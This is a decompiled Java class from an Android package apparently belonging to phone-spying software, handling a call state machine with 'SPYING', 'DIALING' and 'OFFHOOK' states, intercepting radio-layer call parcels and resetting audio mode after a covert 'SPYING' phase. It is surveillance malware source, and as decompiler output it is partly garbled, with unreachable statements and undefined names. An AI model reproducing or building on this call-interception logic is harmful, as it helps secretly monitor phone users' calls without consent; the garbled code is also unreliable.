package com.vvt.callmanager.filter;

import android.media.AudioManager;
import android.os.Parcel;
import com.vvt.callmanager.a.l;
import com.vvt.callmanager.a.m;
import com.vvt.callmanager.ref.BugEngineCallState;

 enum FilterGsmCall$CallState$2
{
  private Object transition;
  
  FilterGsmCall$CallState$2()
  {
    super(paramString, paramInt, null);
  }
  
  public void onEnter(Object paramObject)
  {
    boolean bool = FilterGsmCall.b();
    if ((!bool) || (paramObject != null))
    {
      bool = paramObject instanceof FilterGsmCall.CallState;
      if (bool)
      {
        paramObject = (FilterGsmCall.CallState)paramObject;
        localObject = SPYING;
        if (paramObject == localObject)
        {
          FilterGsmCall.a(this.mFilterCall, "SPYING to DIALING -> Reset audio mode");
          localObject = FilterGsmCall.e(this.mFilterCall);
          localBugEngineCallState = null;
          ((AudioManager)localObject).setMode(0);
          localObject = FilterGsmCall.e(this.mFilterCall);
          int i = 2;
          ((AudioManager)localObject).setMode(i);
        }
      }
    }
    FilterGsmCall.a(this.mFilterCall);
    Object localObject = this.mFilterCall;
    BugEngineCallState localBugEngineCallState = BugEngineCallState.GSM_DIALING;
    FilterGsmCall.a((FilterGsmCall)localObject, localBugEngineCallState);
  }
  
  public Object onExit()
  {
    boolean bool = FilterGsmCall.b();
    if (bool) {}
    FilterGsmCall.b(this.mFilterCall);
    return this.transition;
  }
  
  public FilterGsmCall.CallState processResponse(Parcel paramParcel)
  {
    int i = 1;
    Object localObject = FilterGsmCall.c(this.mFilterCall);
    int j = ((m)localObject).c(paramParcel);
    int k = 9;
    if (j == k)
    {
      localObject = l.a(paramParcel);
      j = ((l)localObject).b;
      k = 134744072;
      if (j != k)
      {
        localObject = FilterGsmCall.a(this.mFilterCall, this, paramParcel);
        FilterGsmCall.CallState localCallState = OFFHOOK;
        if (localObject == localCallState) {
          this.transition = paramParcel;
        }
      }
    }
    for (;;)
    {
      if (i != 0)
      {
        localFilterGsmCall = this.mFilterCall;
        localFilterGsmCall.c(paramParcel);
      }
      return (FilterGsmCall.CallState)localObject;
      i = 0;
      FilterGsmCall localFilterGsmCall = null;
      break;
      localObject = this;
    }
  }
  
  public FilterGsmCall.CallState processRilRequest(Parcel paramParcel)
  {
    FilterGsmCall.c(this.mFilterCall).b(paramParcel);
    this.mFilterCall.d(paramParcel);
    return this;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/callmgr/classes-enjarify.jar!/com/vvt/callmanager/filter/FilterGsmCall$CallState$2.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */